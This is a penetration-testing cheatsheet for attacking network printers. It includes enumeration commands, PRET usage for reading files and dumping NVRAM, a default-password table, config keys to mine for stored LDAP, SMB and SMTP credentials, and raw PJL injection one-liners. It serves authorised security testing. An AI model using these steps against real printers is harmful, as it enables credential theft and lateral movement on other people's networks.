# Printers — JetDirect / IPP / LPD (9100 / 631 / 515)

[[09 - Service Cheatsheets/00 - README|Folder index]]

## Attacker Mindset

Printers are the most-overlooked, lowest-priority device on the network — and the **most credential-rich**. Modern MFPs store:

- **LDAP service account credentials** (used to look up the address book) — often in cleartext or trivially-reversible in config exports.
- **SMB scan-to-folder credentials** (used to drop scans onto a file share) — also often cleartext.
- **SMTP credentials** for scan-to-email.
- **AD join credentials** if the MFP is domain-joined for Kerberos auth.
- **Stored print jobs** — sometimes including HR forms, financial docs, network diagrams.

Compromise vector is usually the **web admin UI** (default creds) → export config → harvest creds. Then those LDAP/SMB creds frequently work elsewhere.

| Port | Protocol | Purpose |
| ---: | --- | --- |
| 9100 | JetDirect / RAW | Direct print + PJL/PostScript command channel |
| 631 | IPP / CUPS | Internet Printing Protocol; CUPS admin on Linux |
| 515 | LPD | Legacy line printer daemon |

**Note:** PrintNightmare (CVE-2021-34527) affects the **Windows Print Spooler service on print servers**, not the printer itself. See [[../06 - Gaining Access/24 - PrintNightmare Reference]].

## Enumerate

```bash
nmap -p 9100,631,515 -sV -sC $IP
nmap -p 9100 --script pjl-ready-message $IP
nmap -p 631 --script ipp-info,cups-info,cups-queue-info $IP

# Banner grab on JetDirect — vendor and firmware
nc $IP 9100
# Press Ctrl+C if it hangs; some printers banner immediately on connect
```

## PRET — the printer multitool

PRET (Printer Exploitation Toolkit) speaks PJL, PostScript, and PCL. Filesystem access on MFPs that allow it.

```bash
git clone https://github.com/RUB-NDS/PRET
cd PRET
./pret.py $IP pjl       # PJL mode (HP, most MFPs)
./pret.py $IP ps        # PostScript mode
./pret.py $IP pcl       # PCL mode

# Inside PRET:
ls                       # list filesystem
cat /etc/passwd          # try common paths
download /path/to/file   # exfil files from printer FS
nvram dump               # dump non-volatile config (often has creds)
display "OWNED"          # set printer LCD message
```

## Web admin UI — default credentials

| Vendor | Username | Password |
| --- | --- | --- |
| HP (most LaserJet/OfficeJet) | (none) | (blank) or `admin` / `admin` |
| HP iLO MFP admin | admin | (blank) |
| Lexmark | admin | (blank) or `1234` |
| Xerox | admin | 1111 |
| Canon iR-ADV | 7654321 | 7654321 |
| Brother | admin | initpass / access |
| Konica Minolta | admin | 12345678 |
| Ricoh / Savin | admin | (blank) |
| Sharp MFP | admin | admin / Sharp |

**Always export the config file** via the web UI once you have admin. Search for:

- `ldapServerPassword`, `ldapPassword`, `bind_password`
- `smbPassword`, `cifsPassword`, `scanPassword`
- `smtpPassword`, `mailPassword`
- `kerberosPassword`

These are routinely Base64'd or XOR'd, not hashed.

## SNMP on printers

Printers respond to SNMP with rich info — uptime, queue state, error logs, sometimes **stored credentials in vendor MIBs**.

```bash
snmpwalk -c public -v 2c $IP                       # full walk
snmpwalk -c public -v 2c $IP 1.3.6.1.2.1.43         # printer MIB tree
onesixtyone -c community.txt $IP                    # community brute
```

Try `public`, `private`, `internal`, `printer`, and the company name.

## Send raw print jobs (PoC / nuisance demonstration)

```bash
# Direct text to JetDirect
echo "Test page from $(hostname) - $(date)" | nc -q1 $IP 9100

# PJL display message
printf '\x1b%%-12345X@PJL RDYMSG DISPLAY="OWNED"\r\n\x1b%%-12345X' | nc -q1 $IP 9100
```

## IPP / CUPS specific

```bash
# List queues
ipptool -tv ipp://$IP/printers/ get-printer-attributes.test

# CUPS admin UI on Linux print servers
curl -s http://$IP:631/admin
# CVE-2024-47176 / 47175 / 47076 / 47177 — unauth RCE in CUPS, late 2024
```

## Why printers matter even when the engagement says "no DoS"

You almost never need to disrupt printing. The value is config export → credential harvest → **reuse those creds on the file share / LDAP / domain.** Document the printer compromise as a stepping stone, not the goal.
